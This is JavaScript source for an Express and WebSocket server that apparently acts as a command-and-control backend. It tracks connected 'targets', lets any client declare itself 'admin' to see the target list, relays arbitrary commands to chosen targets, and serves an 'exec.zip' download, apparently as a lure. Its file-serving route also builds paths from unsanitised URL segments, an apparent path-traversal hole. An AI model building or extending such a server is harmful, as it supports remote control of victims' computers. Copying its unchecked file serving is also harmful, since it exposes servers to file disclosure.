const PORT = process.env.PORT || 2007;
const websoket_port = 8080

const express = require('express');
const {WebSoketServer} = require('ws')
const cors = require('cors');
const app = express();
const wss = new WebSoketServer({port:websoket_port})
const clientsS = new Set();
const clientsM = new Map();
app.use(cors({origin:'*'}));
var list_target = []
var admins = []
let WS = 0


wss.on('connection',(ws)=>{
    WS ++ 
    if (ws._id == undefined) {
        ws._id = WS
    }
    console.log('new connected : ' + ws._id)
    clientsS.add(ws) 
    ws.on('message',(message)=>{   
            if (message instanceof Buffer) {
                var message = message.toString('utf-8');
            
            try{    
                const data = JSON.parse(message)
                if (data.method == "send_to") {
                clientsS.forEach(client =>{
                    if (client._id == data.send_to) {
                        client.send(JSON.stringify(data.data))
                        return   
                    }  
                })
                } 
                if (data.method == "save"){ 
                    ws._id = data.data._id 
                    let l = false
                    for (let i = 0; i < list_target.length; i++) { 
                        if (list_target[i]._id === data._id){
                            l = true
                            let item = data.data  
                            item._id_ws = ws._id
                            item.online = true
                            list_target[i] = item
                        }
                    } 
                    if (l == false) {
                        let item = data.data
                        item._id_ws = ws._id
                        item.online = true
                        list_target.push(item)
                    }
                }
                
            }catch (error){
                if (message == 'get_me_data') {
                    let l = false
                    for (let e = 0; e < admins.length; e++) {
                        if (admins[e] == ws._id) {
                            l = true
                        }
                    } 
                    if (l == false) {
                        admins.push(ws._id)
                        ws.send(JSON.stringify({"this_ws_id":ws._id}))
                        console.log(admins)
                    }
                }
                console.log('errer!' + error)
            }
        SEND_ADMINS()
    }})
    ws.on('close',()=>{
        console.log('client disconncted : ' )
        for (let i = 0; i < list_target.length; i++) {
            if (list_target[i]._id_ws == ws._id) {
                list_target[i].online = false 
                console.log(list_target[i])
            }            
        }
        for (let e = 0; e < admins.length; e++) { 
            if (admins[e] === ws._id) {
                if (e == 0) {
                    admins.splice(e,e+1)
                    console.log(admins)
                }else{
                    admins.splice(e,e)
                    console.log(admins)
                }
            }
        }
        clientsS.delete(ws)
        SEND_ADMINS()
    })
})
const SEND_ADMINS = ()=>{
    let D = {
        targets:list_target
    }
    for (let z = 0;z < admins.length;z++) { 
        clientsS.forEach(item =>{
            if (item._id == admins[z]) {
                item.send(JSON.stringify(D))
            }
        })
    }
}
app.get('/',(req,res)=>{
    res.sendFile(GET_DATA('download','index.html'))
})
app.get('/download',(req,res)=>{
    res.download(__dirname+'DATA/download/src/exec.zip')
})
app.get('/list',(req,res)=>{
    res.sendFile(GET_DATA('home','index.html'))
})


app.get('/GET_DATA/:a1/:a2/:a3/:a4/:a5/:a6',(req,res)=>{
    let a2,a3,a4,a5,a6

    if (req.params.a2 == 'n'){a2 = undefined}else{a2 = req.params.a2}
    if (req.params.a3 == 'n'){a3 = undefined}else{a3 = req.params.a3}
    if (req.params.a4 == 'n'){a4 = undefined}else{a4 = req.params.a4}
    if (req.params.a5 == 'n'){a5 = undefined}else{a5 = req.params.a5}
    if (req.params.a6 == 'n'){a6 = undefined}else{a6 = req.params.a6}
    res.sendFile(GET_DATA(req.params.a1,a2,a3,a4,a5,a6))
})
const GET_DATA = (p1,p2,p3,p4,p5,p6)=>{
    if (p2 == undefined) {p2 = ''}else{p2 = `/${p2}`}
    if (p3 == undefined) {p3 = ''}else{p3 = `/${p3}`}
    if (p4 == undefined) {p4 = ''}else{p4 = `/${p4}`}
    if (p5 == undefined) {p5 = ''}else{p5 = `/${p5}`}
    if (p6 == undefined) {p6 = ''}else{p6 = `/${p6}`}
    return __dirname + `/DATA/${p1}${p2}${p3}${p4}${p5}${p6}`
} 
app.listen(PORT,()=>{
    console.log('sirver:'+PORT);
});